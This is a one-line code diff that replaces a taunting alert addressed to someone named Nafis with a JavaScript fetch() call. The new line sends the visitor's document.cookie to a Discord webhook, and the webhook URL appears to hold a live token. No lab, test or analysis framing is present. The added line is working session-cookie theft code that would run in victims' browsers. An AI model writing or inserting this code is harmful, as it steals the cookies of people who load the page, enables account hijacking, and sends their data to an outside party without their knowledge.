@@ -1,1 +1,1 @@
-alert("Nafis you are cooked")
+fetch("https://discord.com/api/webhooks/1323967300499537931/ge2QrWIz35nkFo-NYhbm8Rnb2m2TfjLrsU3iP9X23LMfVwGvbGvdkH1D7Rf_li61lqGx", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({content: document.cookie})});
